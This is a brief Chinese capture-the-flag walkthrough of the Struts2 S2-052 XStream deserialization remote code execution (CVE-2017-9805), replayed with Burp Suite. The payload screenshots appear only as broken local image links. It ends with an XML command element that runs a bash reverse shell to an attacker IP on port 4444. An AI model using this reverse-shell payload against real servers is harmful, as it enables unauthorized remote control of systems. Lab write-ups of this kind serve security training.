struts2-052 远程代码执行 （CVE-2017-9805）

。漏洞的成因是由于使用XStreamHandler反序列化XStream实例的时候没有执行严格的过滤导致远程代码执行。

打开靶场

![img](file:///C:\Users\e'e't\AppData\Local\Temp\ksohtml\wpsB5D2.tmp.jpg) 

抓包

![img](file:///C:\Users\e'e't\AppData\Local\Temp\ksohtml\wpsB5D3.tmp.jpg) 

在burpsuite中改包进行重放，payload如下。

![img](file:///C:\Users\e'e't\AppData\Local\Temp\ksohtml\wpsB5D4.tmp.jpg) 

上面的数据包中执行命令的地方在这里：

![img](file:///C:\Users\e'e't\AppData\Local\Temp\ksohtml\wpsB5D5.tmp.jpg) 

执行的是创建shell.txt文件的命令，但我们需要的是获取flag，于是修改pyload,改成反弹shell的命令：
在远程命令执行过程中，由于务器不识别&这个符号，需要编码，将&换成 &，如下所示

<command>

<string>bash</string>

<string>-c</string>

<string>bash -i >& /dev/tcp/192.168.19.128/4444 0>&1</string>

</command> 